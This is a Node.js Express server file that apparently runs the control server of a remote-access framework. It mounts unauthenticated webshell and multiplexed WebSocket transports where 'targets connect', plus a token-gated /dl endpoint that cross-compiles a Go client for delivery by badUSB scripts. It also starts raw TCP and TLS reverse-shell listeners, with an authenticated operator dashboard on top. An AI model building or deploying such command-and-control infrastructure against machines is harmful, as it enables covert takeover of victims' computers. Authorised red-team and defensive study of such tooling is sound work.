import path from "node:path";
import { fileURLToPath } from "node:url";
import express from "express";
import expressWs from "express-ws";

import config from "./config.js";
import {
  requireAuth,
  authEnabled,
  authorized,
  checkCredentials,
  issueToken,
  sessionCookie,
  clearCookie,
  csrf,
} from "./api/auth.js";
import { loginPage } from "./api/login-page.js";
import { restRouter } from "./api/rest.js";
import { registerWs } from "./api/ws.js";
import { webshellRouter } from "./transports/webshell.js";
import { startTcp } from "./transports/tcp.js";
import { startTls } from "./transports/tls.js";
import { registerMux } from "./transports/mux.js";
import { dlRouter } from "./api/build.js";

const here = path.dirname(fileURLToPath(import.meta.url));
const isSecure = (req) =>
  req.secure || req.headers["x-forwarded-proto"] === "https";

const app = express();
// express-ws attaches the WebSocket upgrade handler to THIS app's HTTP server,
// so the dashboard, REST, static assets, all WebSocket endpoints and the HTTP
// shell transports share one host and one port.
expressWs(app);

// --- Security headers (applied to every response) --------------------------
app.use((req, res, next) => {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; " +
      "img-src 'self' data:; font-src 'self'; connect-src 'self'; object-src 'none'; " +
      "frame-ancestors 'none'; base-uri 'self';"
  );
  if (isSecure(req)) {
    res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
  }
  next();
});

// --- Shell-facing transports (UNAUTHENTICATED) -----------------------------
// These are where targets connect; they must not require operator credentials.
app.use("/webshell", webshellRouter()); // HTTP beacon transport
registerMux(app); // ws /mux — multiplexed protobuf shell transport

// --- Public, token-gated endpoint (for badUSB scripts) --------------------
// /dl cross-compiles + downloads the Go client for the target OS/arch.
// Requires ?token=BUILD_TOKEN and is mounted before requireAuth.
app.use("/dl", dlRouter());

// --- Auth bootstrap (unauthenticated by necessity) -------------------------
app.get("/login", (req, res) => {
  if (authorized(req)) return res.redirect("/");
  res.type("html").send(loginPage({ error: Boolean(req.query.error) }));
});
app.post("/login", express.urlencoded({ extended: false }), (req, res) => {
  if (!authEnabled()) return res.redirect("/");
  const { username, password } = req.body || {};
  if (checkCredentials(username, password)) {
    const { token } = issueToken(username);
    res.setHeader("Set-Cookie", sessionCookie(token, isSecure(req)));
    return res.redirect("/");
  }
  res.redirect("/login?error=1");
});
app.post("/logout", (req, res) => {
  res.setHeader("Set-Cookie", clearCookie());
  res.redirect("/login");
});

// --- Everything past here requires an operator session ---------------------
app.use(requireAuth());

// Browser <-> server WebSocket endpoints (self-authenticate: express-ws
// upgrades bypass app.use middleware).
registerWs(app);

// REST API (CSRF-protected for mutating methods).
app.use("/api", csrf, restRouter());

// Static dashboard (built bundle lives in public/dist).
app.use(express.static(path.join(here, "public")));

// SPA fallback for qrp's history routing.
app.get(/.*/, (req, res, next) => {
  if (req.path.startsWith("/api") || req.path.startsWith("/webshell")) {
    return next();
  }
  res.sendFile(path.join(here, "public", "index.html"));
});

app.listen(config.PORT, config.HOST, () => {
  console.log(`[http] dashboard + API on http://${config.HOST}:${config.PORT}`);
});

// Raw socket reverse-shell listeners.
startTcp();
startTls();

if (config.ENABLE_WEBSHELL) {
  console.log(`[web]  webshell transport at /webshell (port ${config.PORT})`);
}
if (config.ENABLE_MUX) {
  console.log(`[mux]  multiplexed shell transport at ws://…:${config.PORT}/mux`);
}
